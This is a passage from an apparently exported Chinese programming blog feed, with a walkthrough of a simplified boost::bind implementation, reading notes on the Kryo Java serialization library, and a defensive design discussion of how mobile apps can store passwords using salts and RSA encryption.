I&gt; struct storage1&lt;boost::arg&lt;I&gt; &gt; &#123; explicit storage1(boost::arg&lt;I&gt;) &#123; cout&lt;&lt;"storage1 storage1(boost::arg&lt;I&gt;)"&lt;&lt;endl; &#125; static boost::arg&lt;I&gt; a1_() &#123; return boost::arg&lt;I&gt;(); &#125;&#125;;template&lt;int I&gt; struct storage1&lt;boost::arg&lt;I&gt; (*)()&gt; &#123; explicit storage1(boost::arg&lt;I&gt; (*)()) &#123; cout&lt;&lt;"storage1 storage1(boost::arg&lt;I&gt; (*)())"&lt;&lt;endl; &#125; static boost::arg&lt;I&gt; a1_() &#123; return boost::arg&lt;I&gt;(); &#125;&#125;;// 2template&lt;class A1, class A2&gt; struct storage2: public storage1&lt;A1&gt; &#123; typedef storage1&lt;A1&gt; inherited; storage2(A1 a1, A2 a2) : storage1&lt;A1&gt;(a1), a2_(a2) &#123; cout&lt;&lt;"storage2 storage2(A1 a1, A2 a2)"&lt;&lt;endl; &#125; A2 a2_;&#125;;template&lt;class A1, int I&gt; struct storage2&lt;A1, boost::arg&lt;I&gt; &gt; : public storage1&lt; A1&gt; &#123; typedef storage1&lt;A1&gt; inherited; storage2(A1 a1, boost::arg&lt;I&gt;) : storage1&lt;A1&gt;(a1) &#123; cout&lt;&lt;"storage2 storage2(A1 a1, boost::arg&lt;I&gt;)"&lt;&lt;endl; &#125; static boost::arg&lt;I&gt; a2_() &#123; return boost::arg&lt;I&gt;(); &#125;&#125;;template&lt;class A1, int I&gt; struct storage2&lt;A1, boost::arg&lt;I&gt; (*)()&gt; : public storage1&lt; A1&gt; &#123; typedef storage1&lt;A1&gt; inherited; storage2(A1 a1, boost::arg&lt;I&gt; (*)()) : storage1&lt;A1&gt;(a1) &#123; cout&lt;&lt;"storage2 storage2(A1 a1, boost::arg&lt;I&gt; (*)())"&lt;&lt;endl; &#125; static boost::arg&lt;I&gt; a2_() &#123; return boost::arg&lt;I&gt;(); &#125;&#125;;// result_traitstemplate&lt;class R, class F&gt; struct result_traits &#123; typedef R type;&#125;;struct unspecified &#123;&#125;;template&lt;class F&gt; struct result_traits&lt;unspecified, F&gt; &#123; typedef typename F::result_type type;&#125;;// valuetemplate&lt;class T&gt; class value &#123;public: value(T const &amp; t) : t_(t) &#123; &#125; T &amp; get() &#123; return t_; &#125;private: T t_;&#125;;// typetemplate&lt;class T&gt; class type &#123;&#125;;// unwraptemplate&lt;class F&gt; struct unwrapper &#123; static inline F &amp; unwrap(F &amp; f, long) &#123; return f; &#125;&#125;;// listNclass list0 &#123;public: list0() &#123; &#125; template&lt;class T&gt; T &amp; operator[](_bi::value&lt;T&gt; &amp; v) const &#123; cout &lt;&lt; "list0 T &amp; operator[](_bi::value&lt;T&gt; &amp; v)" &lt;&lt; endl; return v.get(); &#125; template&lt;class R, class F, class A&gt; R operator()(type&lt;R&gt;, F &amp; f, A &amp;, long) &#123; cout &lt;&lt; "list0 R operator()(type&lt;R&gt;, F &amp; f, A &amp;, long)" &lt;&lt; endl; return unwrapper&lt;F&gt;::unwrap(f, 0)(); &#125; template&lt;class F, class A&gt; void operator()(type&lt;void&gt;, F &amp; f, A &amp;, int) &#123; cout &lt;&lt; "list0 void operator()(type&lt;void&gt;, F &amp; f, A &amp;, int)" &lt;&lt; endl; unwrapper&lt;F&gt;::unwrap(f, 0)(); &#125;&#125;; template&lt;class A1&gt; class list1: private storage1&lt;A1&gt; &#123;private: typedef storage1&lt;A1&gt; base_type;public: explicit list1(A1 a1) : base_type(a1) &#123; &#125; A1 operator[](boost::arg&lt;1&gt;) const &#123; return base_type::a1_; &#125; A1 operator[](boost::arg&lt;1&gt; (*)()) const &#123; return base_type::a1_; &#125; template&lt;class T&gt; T &amp; operator[](_bi::value&lt;T&gt; &amp; v) const &#123; return v.get(); &#125; template&lt;class R, class F, class A&gt; R operator()(type&lt;R&gt;, F &amp; f, A &amp; a, long) &#123; return unwrapper&lt;F&gt;::unwrap(f, 0)(a[base_type::a1_]); &#125;// template&lt;class F, class A&gt; void operator()(type&lt;void&gt;, F &amp; f, A &amp; a, int) &#123;// unwrapper&lt;F&gt;::unwrap(f, 0)(a[base_type::a1_]);// &#125;&#125;; template&lt;class A1, class A2&gt; class list2: private storage2&lt;A1, A2&gt; &#123;private: typedef storage2&lt;A1, A2&gt; base_type;public: list2(A1 a1, A2 a2) : base_type(a1, a2) &#123; &#125; A1 operator[](boost::arg&lt;1&gt;) const &#123; cout &lt;&lt; "list2 A1 operator[](boost::arg&lt;1&gt;)" &lt;&lt; endl; return base_type::a1_; &#125; A2 operator[](boost::arg&lt;2&gt;) const &#123; cout &lt;&lt; "list2 A1 operator[](boost::arg&lt;2&gt;)" &lt;&lt; endl; return base_type::a2_; &#125; A1 operator[](boost::arg&lt;1&gt; (*)()) const &#123; cout &lt;&lt; "list2 A1 operator[](boost::arg&lt;1&gt; (*)())" &lt;&lt; endl; return base_type::a1_; &#125; A2 operator[](boost::arg&lt;2&gt; (*)()) const &#123; cout &lt;&lt; "list2 A1 operator[](boost::arg&lt;2&gt; (*)())" &lt;&lt; endl; return base_type::a2_; &#125; template&lt;class T&gt; T &amp; operator[](_bi::value&lt;T&gt; &amp; v) const &#123; cout &lt;&lt; "T &amp; operator[](_bi::value&lt;T&gt; &amp; v)" &lt;&lt; endl; return v.get(); &#125; template&lt;class R, class F, class A&gt; R operator()(type&lt;R&gt;, F &amp; f, A &amp; a, long) &#123; return f(a[base_type::a1_], a[base_type::a2_]);// return unwrapper&lt;F&gt;::unwrap(f, 0)(a[base_type::a1_], a[base_type::a2_]); &#125;// template&lt;class F, class A&gt; void operator()(type&lt;void&gt;, F &amp; f, A &amp; a, int) &#123;// unwrapper&lt;F&gt;::unwrap(f, 0)(a[base_type::a1_], a[base_type::a2_]);// &#125;&#125;;// bind_ttemplate&lt;class R, class F, class L&gt; class bind_t &#123;public: typedef bind_t this_type; bind_t(F f, L const &amp; l) : f_(f), l_(l) &#123; &#125; typedef typename result_traits&lt;R, F&gt;::type result_type; result_type operator()() &#123; cout &lt;&lt; "bind_t::result_type operator()()" &lt;&lt; endl; list0 a; return l_(type&lt;result_type&gt;(), f_, a, 0); &#125; template&lt;class A1&gt; result_type operator()(A1 &amp; a1) &#123; list1&lt;A1 &amp;&gt; a(a1); return l_(type&lt;result_type&gt;(), f_, a, 0); &#125; template&lt;class A1, class A2&gt; result_type operator()(A1 &amp; a1, A2 &amp; a2) &#123; list2&lt;A1 &amp;, A2 &amp;&gt; a(a1, a2); return l_(type&lt;result_type&gt;(), f_, a, 0); &#125;private: F f_; L l_;&#125;; template&lt;class T, int I&gt; struct add_value_2 &#123; typedef boost::arg&lt;I&gt; type;&#125;; template&lt;class T&gt; struct add_value_2&lt;T, 0&gt; &#123; typedef _bi::value&lt;T&gt; type;&#125;;template&lt;class T&gt; struct add_value &#123; typedef typename add_value_2&lt;T, boost::is_placeholder&lt;T&gt;::value&gt;::type type;&#125;;template&lt;class T&gt; struct add_value&lt;value&lt;T&gt; &gt; &#123; typedef _bi::value&lt;T&gt; type;&#125;;template&lt;int I&gt; struct add_value&lt;arg&lt;I&gt; &gt; &#123; typedef boost::arg&lt;I&gt; type;&#125;;//template&lt;int I&gt; struct add_value&lt;arg&lt;I&gt; (*)()&gt; &#123;// typedef boost::arg&lt;I&gt; (*type)();//&#125;;template&lt;class R, class F, class L&gt; struct add_value&lt;bind_t&lt;R, F, L&gt; &gt; &#123; typedef bind_t&lt;R, F, L&gt; type;&#125;;// list_av_Ntemplate&lt;class A1&gt; struct list_av_1 &#123; typedef typename add_value&lt;A1&gt;::type B1; typedef list1&lt;B1&gt; type;&#125;;template&lt;class A1, class A2&gt; struct list_av_2 &#123; typedef typename add_value&lt;A1&gt;::type B1; typedef typename add_value&lt;A2&gt;::type B2; typedef list2&lt;B1, B2&gt; type;&#125;;&#125; // namespace _bi // function pointerstemplate&lt;class R&gt;_bi::bind_t&lt;R, R (*)(), _bi::list0&gt; bind2(R (*f)()) &#123; typedef R (*F)(); typedef _bi::list0 list_type; return _bi::bind_t&lt;R, F, list_type&gt;(f, list_type());&#125;template&lt;class R, class B1, class A1&gt;_bi::bind_t&lt;R, R (*)(B1), typename _bi::list_av_1&lt;A1&gt;::type&gt; bind2(R (*f)(B1), A1 a1) &#123; typedef R (*F)(B1); typedef typename _bi::list_av_1&lt;A1&gt;::type list_type; return _bi::bind_t&lt;R, F, list_type&gt;(f, list_type(a1));&#125;template&lt;class R, class B1, class B2, class A1, class A2&gt;_bi::bind_t&lt;R, R (*)(B1, B2), typename _bi::list_av_2&lt;A1, A2&gt;::type&gt; bind2( R (*f)(B1, B2), A1 a1, A2 a2) &#123; typedef R (*F)(B1, B2); typedef typename _bi::list_av_2&lt;A1, A2&gt;::type list_type; return _bi::bind_t&lt;R, F, list_type&gt;(f, list_type(a1, a2));&#125;&#125; // namespace boost namespace &#123;boost::arg&lt;1&gt; _1;boost::arg&lt;2&gt; _2;&#125;#endif // #ifndef BOOST_BIND_BIND_HPP_INCLUDED__Mybind main.cpp： 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include "myBind.h"using namespace std;void tow_arguments(int i1, int i2) &#123; std::cout &lt;&lt; i1 &lt;&lt; i2 &lt;&lt; '\n';&#125; class Test&#123;&#125;;void testClass(Test t, int i)&#123; cout&lt;&lt;"testClass,Test,int"&lt;&lt;endl;&#125; int main() &#123; int i1 = 1, i2 = 2; (boost::bind2(&amp;tow_arguments, 123, _1))(i1, i2); (boost::bind2(&amp;tow_arguments, _1, _2))(i1, i2); (boost::bind2(&amp;tow_arguments, _2, _1))(i1, i2); (boost::bind2(&amp;tow_arguments, _1, _1))(i1, i2); (boost::bind2(&amp;tow_arguments, 222, 666))(i1, i2); Test t; (boost::bind2(&amp;testClass, _1, 666))(t, i2); (boost::bind2(&amp;testClass, _1, 666))(t); (boost::bind2(&amp;testClass, t, 666))();&#125; 在上面的代码中有很多个类，有几个是比较重要的any，storage，list和bind_t。 先来看类any： 12345678template&lt;int I&gt; struct arg &#123; arg() &#123; &#125;&#125;;namespace &#123;boost::arg&lt;1&gt; _1;boost::arg&lt;2&gt; _2;&#125; 在上面的代码中，我们看到了_1和_2，没错，所谓的占位符就是这么个东东，在匿名名字空间中定义的空的struct。接下来是storage1,storage2类： 12345678910111213141516171819template&lt;class A1&gt; struct storage1 &#123; explicit storage1(A1 a1) : a1_(a1) &#123; &#125; A1 a1_;&#125;;...// 2template&lt;class A1, class A2&gt; struct storage2: public storage1&lt;A1&gt; &#123; typedef storage1&lt;A1&gt; inherited; storage2(A1 a1, A2 a2) : storage1&lt;A1&gt;(a1), a2_(a2) &#123; &#125; A2 a2_;&#125;;... 可以看出storage类只是简单的继承关系，实际上storage类是用来存储bind函数所传递进来的参数的值的，之所以采用继承而不用组合，其实有精妙的用处。 接着看类list1和list2，它俩分别是storage1和storage2的子类（即参数是存放在listN类中的）： 123456template&lt;class A1&gt; class list1: private storage1&lt;A1&gt; &#123;...&#125;template&lt;class A1, class A2&gt; class list2: private storage2&lt;A1, A2&gt; &#123;...&#125; 仔细看代码，可以看到 list1和list2重载了operator [ ] 和operator () 函数，这些重载函数很关键，下面会谈到。 再看类bind_t： 123456789101112131415161718template&lt;class R, class F, class L&gt; class bind_t &#123;public: typedef bind_t this_type; bind_t(F f, L const &amp; l) : f_(f), l_(l) &#123; &#125; typedef typename result_traits&lt;R, F&gt;::type result_type; result_type operator()() &#123; cout&lt;&lt;"bind_t::result_type operator()()"&lt;&lt;endl; list0 a; return l_(type&lt;result_type&gt;(), f_, a, 0); &#125;...private: F f_; //bind所绑定的函数 L l_; //实际是是listN类，存放bind传绑定的参数&#125;; 同样，我们可以看到bind_t类重载了operator ()函数，实际上，bind_t类是bind函数的返回类型，bind_t实际上是一个stl意义上的funtor。注意bind_t的两个成员F f_ 和 L l_，这里是关键之处。 介绍完关键类，下面以main.cpp中下面部分代码为例，详细说明它的工作流程。 12int i1 = 1, i2 = 2;(boost::bind2(&amp;tow_arguments, 123, _1))(i1, i2); 首先bind2函数返回一个bind_t类，这个类中的F成员，保存了tow_arguments函数指针，L成员（即list2类），保存了参数123 和 _1。bind_t类采用的是以下的特化： 123template&lt;class R, class B1, class B2, class A1, class A2&gt;_bi::bind_t&lt;R, R (*)(B1, B2), typename _bi::list_av_2&lt;A1, A2&gt;::type&gt; bind2( R (*f)(B1, B2), A1 a1, A2 a2) 其中storage2类（list2的父类）和storage1类，分别采用的是以下的特化： 1template&lt;class A1, int I&gt; struct storage2&lt;A1, boost::arg&lt;I&gt; &gt; : public storage1&lt;A1&gt; 1template&lt;class A1&gt; struct storage1 （这里可以试下把123和_1互换位置，就能发现storage系列类用继承的精妙之处了，这里不展开了） 当bind_t调用operator (i1, i2)函数时，即以下函数： 1234template&lt;class A1, class A2&gt; result_type operator()(A1 &amp; a1, A2 &amp; a2) &#123; list2&lt;A1 &amp;, A2 &amp;&gt; a(a1, a2); return l_(type&lt;result_type&gt;(), f_, a, 0); //operator ()&#125; 再次生成一个list2，这个list2中保存的是i1 和 i2的值。接着调用l_.operator() (type&lt;result_type&gt;(), f_, a, 0)函数（还记得l_是什么东东不？） l_实际是上刚才保存了123和1的list2！而f是由bind函数据绑定的函数的指针！ 接着看list2的operator() 函数的实现： 12345 template&lt;class R, class F, class A&gt; R operator()(type&lt;R&gt;, F &amp; f, A &amp; a, long) &#123; return f(a[base_type::a1_], a[base_type::a2_]);// return unwrapper&lt;F&gt;::unwrap(f, 0)(a[base_type::a1_], a[base_type::a2_]); //本是这句的，简化了下，无关要紧 &#125; 可以看到f是bind所绑定的函数的指针，即这里是调用了我们所绑定的函数。那么参数是从哪里来的？注意A &amp;a实际上是保存了i1和i2的list2！，所以这里又调用了list2的operator[ ]函数！ 再看下list2的operator[] 函数的实现： 12345678910111213141516171819202122A1 operator[](boost::arg&lt;1&gt;) const &#123; cout &lt;&lt; "list2 A1 operator[](boost::arg&lt;1&gt;)" &lt;&lt; endl; return base_type::a1_;&#125;A2 operator[](boost::arg&lt;2&gt;) const &#123; cout &lt;&lt; "list2 A1 operator[](boost::arg&lt;2&gt;)" &lt;&lt; endl; return base_type::a2_;&#125;A1 operator[](boost::arg&lt;1&gt; (*)()) const &#123; cout &lt;&lt; "list2 A1 operator[](boost::arg&lt;1&gt; (*)())" &lt;&lt; endl; return base_type::a1_;&#125;A2 operator[](boost::arg&lt;2&gt; (*)()) const &#123; cout &lt;&lt; "list2 A1 operator[](boost::arg&lt;2&gt; (*)())" &lt;&lt; endl; return base_type::a2_;&#125;template&lt;class T&gt; T &amp; operator[](_bi::value&lt;T&gt; &amp; v) const &#123; cout &lt;&lt; "T &amp; operator[](_bi::value&lt;T&gt; &amp; v)" &lt;&lt; endl; return v.get();&#125; 貌似问题都解决了，其实这里还有一个关键要素，两个list2是怎么合并起来，组成正确的参数传递给函数f的？（第一个list2存放了123和_1，第二个list2存放了i1和i2）传递给tow_arguments函数的参数实际是是（123, 1）！ 这里要仔细研究这些operator[]函数的实现，才能真正理解其过程。 注意，上面的的代码中bind2只能绑定普通的函数，不能绑定类成员函数，functor，智能指针等。不过其实区别不大，只是增加一些特化的代码而已。 还有一些const相关的函数删掉了。 后记从代码可以看到boost::bind和原生的函数指针相比，会损失效率（两次的寻址，函数参数的拷贝，有一些可能没有inline的函数调用）。 不得不吐槽下boost的代码中那些神奇的宏，如果不是IDE有提示，我想真心弄不明白到底哪段是有意义的。。有时候还很神奇地include一部分代码进来（不是头文件，只是实现的一部分！）。 不得不吐槽下模板编程中的const，为了一个函数，比如int sum(int a, int b); 就得写四个重载函数来对应不同参数是或者不是const的情况。所以大家可以想像bind最多支持9个参数，那么有多少种情况了。 boost::bind的实现的确非常精巧，隐藏了很多复杂性。在《C++沉思录》中作者说到世界是复杂的，可以通过复杂性获取简单性。也许这个是对的，但是对于无数的后来的程序员总会有人想要看看黑盒子里到底是什么东东，结果总要花大量的时间才能理解，才能获得这种“简单性”。 C++的模板代码中最痛苦的是到处都是typedef，一个typedef就把所有的类型信息都干掉了！而这东东又是必须的。 也许C++给编程语言技术带来的最大贡献就是牛B的编译器了！ C++11中貌似部分的支持concept，希望这个能简化模板编程。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cpp</tag>
        <tag>boost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kryo简介及代码阅读笔记]]></title>
    <url>%2Fabout-kryo%2F</url>
    <content type="text"><![CDATA[更新更新：2012-08-01 版本 2.16长时间运行可能会导致OOM，版本2.18有bug，不能正确序列化map和collection。 真是悲剧，所用的每一个版本都有bug。不过从代码来看，作者有时的确比较随便。。测试用例也少。。（比起msgpack少多了） 简介Kryo官方网站：https://code.google.com/p/kryo/ 优点 速度快！见https://github.com/eishay/jvm-serializers/wiki/Staging-Results 支持互相引用，比如类A引用类B，类B引用类A，可以正确地反序列化。 支持多个引用同一个对象，比如多个类引用了同一个对象O，只会保存一份O的数据。 支持一些有用的注解，如@Tag，@Optional。 支持忽略指定的字段。 支持null 代码入侵少 代码比较简法（比起msgpack，少得多） 缺点 bug多 2.12，2.14都有bug 文档比较少，有些使用方法要看代码才能理解，最新版2.14有bug，不能正确反序列化map类型。 不是跨语言的解决方案 貌似每一个类都要注册下，不然只能用writeClassAndObject和readClassAndObject函数。 类要有一个空的构造函数，不然不能序列化。 （如果这个构造函数里调用了别的资源，而这个资源没有初始化，那么就悲剧了。） 可以通过实现KryoSerializable接口来避免这个问题。。 同样不能解决这个问题 Java自带的则不用调用这个构造函数。 msgpack同样有这个问题。 接口 KryoSerializable KryoCopyable 实现忽略指定的字段 使用transient关键字 使用Context结合@Optional注解 使用@Tag注解（很麻烦） 实现KryoSerializable接口（比较麻烦，相当于手写代码） 引用可以用setReferences(boolean )函数来设置，默认是打开的。 引用的实现原理： 原本以为要实现引用是个比较麻烦的事，因为一想到引用，头脑中就出现一个图。。但在看了代码后，发现是比较简单的。 在Kryo类中有一个writtenObjects的ArrayList，记录已写入的对象。有一个readObjects来记录已写入的对象。 另外有个depth来记录深度，每写一个对象时depth++，当写完时depth–，当depth == 0时，调用reset函数，清空writtenObjects和。 比如写一个大对象，这个对象有很多成员，每一个成员都是一个对象，而成员之间有可能用引用关系（A引用了B，B也引用了A）。 123private int depth, maxDepth = Integer.MAX_VALUE, nextRegisterID;private final ArrayList writtenObjects = new ArrayList();private final ArrayList readObjects = new ArrayList(); 每当写一个对象时，都到里面去检查有没有这个对象，如果有的话，就只写一个int即可。这个int是要表明这个对象当前在的位置即可。 因为当反序列化时，可以据读到的int，正确地从readObjects取回对象。 如果没有，则在输出流中写入writtenObjects的size()+1，再把这个对象放到writtenObjects中。 序列化时，写入引用的对象在writtenObjects中的位置： 123456789101112 for (int i = 0, n = writtenObjects.size(); i &lt; n; i++) &#123; if (writtenObjects.get(i) == object) &#123; if (DEBUG) debug("kryo", "Write object reference " + i + ": " + string(object)); output.writeInt(i + 1, true); // + 1 because 0 means null. return true; &#125;&#125;// Only write the object the first time encountered in object graph.output.writeInt(writtenObjects.size() + 1, true);writtenObjects.add(object); 反序列化时，据id从readObjects得到正确的对象： 1234567 if (--id &lt; readObjects.size()) &#123; Object object = readObjects.get(id); if (DEBUG) debug("kryo", "Read object reference " + id + ": " + string(object)); return object;&#125; 注册貌似每一个类都要注册下，不然只能用writeClassAndObject和readClassAndObject函数。 注册的顺序不能乱！！因为是每一个类都有一个id，而这个id是增长的！ 可以设置registrationRequired，防止没有注册的情况！ 注解annotation貌似只有四个：@Optional，@Tag，@DefaultSerializer，@NotNull 实现原理每注册一个类，都有一个id，由一个IntMap的hashMap来保存（TODO，研究下这个东东的实现） 代码阅读笔记在Kryo类中有以下的成员，简单来看，就是一些HashMap，用来存放id和Class，Class和id，id和Registration，Class和Registration之间的对应关系： 12345private final IntMap&lt;Registration&gt; idToRegistration = new IntMap();private final ObjectMap&lt;Class, Registration&gt; classToRegistration = new ObjectMap();private final IdentityObjectIntMap&lt;Class&gt; classToNameId = new IdentityObjectIntMap();private final IntMap&lt;Class&gt; nameIdToClass = new IntMap();private int nextNameId; //不断增长，分新的Class分配一个新的id，即Registration中的id 每一个类对应一个Registration： 123456 public class Registration &#123; private final Class type; private final int id; //这个要注意，每一个类都有一个唯一的id，这个id是从0开始不断增长的 private Serializer serializer; private ObjectInstantiator instantiator; //复制对象时候用&#125; 直接看这个类的成员，就大概能明白它是怎样回事了。 要注意一点，Registration中的id很重要，可以说是和别的序列化方案相比，高效之处。 在调用Kryo.writeClass(Output output, Class type)函数时， 先查找到这个类的Registration，得到Serializer，再调用write (Kryo kryo, Output output, T object)写到输出流中。 如果没有找到的话，则为这个类生成一个Registration，并放到Kryo类中的对应的HashMap中。 再来说下Serializer： 默认是FieldSerializer，在生成Registration中，如果为这个类找不到Serializer（到defaultSerializers中找）， 则会构造一个FieldSerializer。 FieldSerializer实际是有一个数组存放了每一个field的信息，当调用write (Kryo kryo, Output output, T object)函数时，则历遍所有的field，把每一个field写到输出流中。 123456789 private CachedField[] fields = new CachedField[0]; public class CachedField&lt;X&gt; &#123; final Field field; Class fieldClass; Serializer serializer; boolean canBeNull; int accessIndex = -1;｝ Kryo有两种模式，一种是先注册(regist)，再写对象，即writeObject函数，实际上如果不先注册，在写对象时也会注册，并为class分配一个id。 注意，如果是rpc，则必须两端都按同样的顺序注册，否则会出错，因为必须要明确类对应的唯一id。 另一种是写类名及对象，即writeClassAndObject函数。 writeClassAndObject函数是先写入(-1 + 2)（一个约定的数字），再写入类ID（第一次要先写-1，再写类ID + 类名），写入引用关系（见引用的实现），最后才写真正的数据）。 注意每一次writeClassAndObject调用后信息都会清空，所以不用担心和client交互时会出错。 代码中其它有意思的地方在writeString函数中先判断是不是ascii即，所有都&lt;127，如果是在写string的最后一个字符，会执行这个： 1buffer[position - 1] |= 0x80; 不知为何。。 在readString的时候也会判断： 12 if ((b &amp; 0x80) == 0) &#123;// ascii 是因为这个http://topic.csdn.net/t/20040416/10/2972001.html ？所谓的双字节的？ 为什么比其它的序列化方案要快？为每一个类分配一个id 实现了自己的IntMap 代码中一些取巧的地方： 利用变量memoizedRegistration和memoizedType记录上一次的调用writeObject函数的Class，则如果两次写入同一类型时，可以直接拿到，不再查找HashMap。 这个也许是为什么在测试中kryo要比其它类库要快的原因之一。 注意事项实现KryoSerializable接口 像下面这样实现是错误的。 1234567891011@Overridepublic void write(Kryo kryo, Output output) &#123; // TODO Auto-generated method stub kryo.writeObject(output, this);&#125; @Overridepublic void read(Kryo kryo, Input input) &#123; // TODO Auto-generated method stub kryo.readObject(input, this.getClass());&#125; 实际上只写入了默认构造函数的内容！ 原因是在生成Registration时已在writtenObjects中写入了这个类，所以在Kryo类中的writtenObjects中已有这个类，所以在调用write函数时，如果是用下面的代码，则会以为这个类是已写过的，所以直接写了一个1和它的id！！ 实际上如果实现了KryoSerializable接口，最终是这个类来调用接口的write函数：KryoSerializableSerializer 正确的写法是写入每一个成员，在read函数中把数据读出，再赋值给成员。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>serialization</tag>
        <tag>kryo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动App该如何保存用户密码]]></title>
    <url>%2Fapp-password%2F</url>
    <content type="text"><![CDATA[更新update 2018-06-04 2015年出的一个规范 JSON Web Token (JWT) https://tools.ietf.org/html/rfc7519 JWT 官网： https://jwt.io/ 八幅漫画理解使用JSON Web Token设计单点登录系统： http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/ JSON Web Encryption (JWE) ： https://tools.ietf.org/html/rfc7516 JSON Web Signature (JWS) ： https://tools.ietf.org/html/rfc7515 update 2017-9-6 微信交互协议和加密模式研究：https://github.com/hengyunabc/hengyunabc.github.io/files/1280081/wechat.pdf 背景移动App该如何保存用户密码？ 这个实际上和桌面程序是一样的。 先看下一些软件是如何保存用户密码的 QQ 参考：http://bbs.pediy.com/archive/index.php?t-159045.html，桌面QQ在2012的时候把密码md5计算之后，保存到本地加密的Sqlite数据库里。 手机淘宝 参考：http://blog.csdn.net/androidsecurity/article/details/8666954 手机淘宝是通过本地DES加密，再把密码保存到本地文件里的，如果拿到ROOT权限，能破解出密码明文。 Windows 参考：http://www.freebuf.com/tools/37162.html 我实际测试了下，可以轻松得到所有帐号的密码明文。 Linux 参考：http://blog.csdn.net/lqhbupt/article/details/7787802 linux是通过加盐(salt)，再hash后，保存到/etc/shadow文件里的。 貌似以前的发行版是md5 hash，现在的发行版都是SHA-512 hash。 linux用户密码的hash算法： http://serverfault.com/questions/439650/how-are-the-hashes-in-etc-shadow-generated 实际上是调用了glic里的crypt函数，可以在man手册里查看相关的信息。 可以用下面的命令来生成： 1mkpasswd --method=SHA-512 --salt=xxxx 其中salt参数，可以自己设置，最好是随机生成的。可以用 mkpasswd --method=help 来查看支持的算法。 用户密码该如何保存，还有能做到哪种程度？看完上面一些软件的做法之后，我们来探讨下，用户密码该如何保存，还有能做到哪种程度？ 假定本地存储的hash串/加密串，和加密算法，攻击者都可以得到，或者逆向分析到。 实际上也是如此，通过上面QQ和淘宝的例子，允分说明了加密串是可以得到的。Linux更是一切都是公开的，只要有权限就可以读取到，包括salt值，shah算法，(salt+密码) hash之后的结果。 防止攻击者得到用户密码的明文。这个实际上是从用户的角度出发，即使数据泄露了，影响降到最低。 防止攻击者拿到hash串或者加密串之后，一直都可以登陆。这点对于移动设置是很重要的，比如今天用户连到了一个恶意的wifi，如果攻击者截获到请求，要防止攻击者潜伏几天，或者几个月之后的攻击。必须要让请求的凭据在一天或者几天内失效。 加盐(salt)假如不加盐，那么攻击者可以根据同样的hash值得到很多信息。 比如网站1的数据库泄露了，攻击者发现用户A和用户B的hash值是一样的，然后攻击者通过其它途径拿到了用户A的密码，那么攻击者就可以知道用户B的密码了。 或者攻击者通过彩虹表，暴力破解等方式可以直接知道用户的原来密码。 所以，每个用户的salt值都要是不一样的，这点参考linux的/etc/shadow文件就知道了。 客户端本地存储密码的算法应该用哪种算法来存储？ 从上面的资料来看，手机淘宝是本地DES对称加密，显然很容易就可以破解到用户的真实密码。QQ也是对称加密的数据库里，存储了用户密码的md5值。 显然对称加密算法都是可以逆向得到原来的数据的。那么我们尝试用非对称加密算法，比如RSA来传输用户的密码。 那么用户登陆的流程就变为： 客户端用公钥加密用户密码，保存到本地； 用户要登陆时，发送加密串到服务器； 服务器用私钥解密，得到用户的密码，再验证。 有的人会说，如果服务器的私钥泄露怎么办？ 服务器端换个新的密钥，强制客户端下载新的公钥或者升级。 可以考虑有一个专门的硬件来解密，这个硬件只负责计算，私钥是一次性写入不可读取和修改的。搜索 rsa hardware，貌似的确有这样的硬件。 当然，即使真的私钥泄露，世界一样运转，像OpenSSL的心血漏洞就可能泄露服务器私钥，但大家日子一样过。 非对称加密算法的好处： 即使数据被盗，攻击者拿不到密码的明文 如果发现有部分用户的数据被盗了（公钥加密后的数据），可以通过升级服务器和客户端的版本，让用户重新输入密码，用户还是原来的密码，但是攻击者却登陆不了了。 对于安全要求严格的应用，还可以定期更新私钥，来保证用户的数据安全。 如何防止本地加密串泄露之后，攻击者可能潜伏很久？这点实际上是如何让客户端保存的加密串及时的失效。 比如： 强制要求客户端保存的加密串一周失效； 用户手机中病毒了，攻击者窃取到了加密串。但是清除病毒之后，用户没有够时的修改密码。攻击者是否会潜伏很久？ 发现某木马大规模窃取到了大量的用户本地加密串，是否可以强制用户的本地加密串失效，客户端不用升级，用户不用修改密码，也不会泄露信息？ 下面提出一种 salt + 非对称加密算法的方案来解决这个问题： 用户填写密码，客户端随机生成一个salt值（注意这个salt只是防止中间人拦截到原始的password的加密串），用公钥把 (salt + password)加密，设置首次登陆的参数，发送到服务器； 服务器检查参数，发现是首次登陆，则服务器用私钥解密，得到password（抛弃salt值），验证，如果通过，则随机生成一个salt值，并把salt值保存起来（保存到缓存里，设置7天过期），然后用公钥把(salt + 用户名)加密，返回给客户端。 客户端保存服务器返回的加密串，完成登陆。 客户端下次自动登陆时，把上次保存的加密串直接发给服务器，并设置二次登陆的参数。 服务器检查参数，发现是二次登陆，用私钥解密，得到salt + 用户名，然后检查salt值是否过期了（到缓存中查找，如果没有，即过期），如果过期，则通知客户端，让用户重新输入密码。如果没有过期，再验证密码是否正确。如果正确，则通知客户端登陆成功。 如果发现某帐户异常，可以直接清除缓存中对应用户的salt值，这样用户再登陆就会失败。同理，如果某木马大规模窃取到了大量的用户本地加密串，那么可以把缓存中所有用户的salt都清除，那么所有用户都要重新登陆。注意用户的密码不用修改。 第2步中服务器生成的salt值，可以带上用户的mac值，os版本等，这样可以增强检验。 注意，为了简化描述，上面提到的用户的password，可以是先用某个hash算法hash一次。 具体的登陆流程浏览器登陆的流程浏览器的登陆过程比较简单，只要用RSA公钥加密密码就可以了。防止中间人截取到明文的密码。 App登陆保存数据流程App因为要实现自动登陆功能，所以必然要保存一些凭据，所以比较复杂。 App登陆要实现的功能： 密码不会明文存储，并且不能反编绎解密； 在服务器端可以控制App端的登陆有效性，防止攻击者拿到数据之后，可以长久地登陆； 用户如果密码没有泄露，不用修改密码就可以保证安全性； 可以区分不同类型的客户端安全性；比如Android用户受到攻击，只会让Android用户的登陆失效，IOS用户不受影响。 App第一次登陆流程 用户输入密码，App把这些信息用RSA公钥加密：(用户名,密码,时间,mac,随机数)，并发送到服务器。 服务器用RSA私钥解密，判断时间（可以动态调整1天到7天），如果不在时间范围之内，则登陆失败。如果在时间范围之内，再调用coreservice判断用户名和密码。 这里判断时间，主要是防止攻击者截取到加密串后，可以长久地利用这个加密串来登陆。 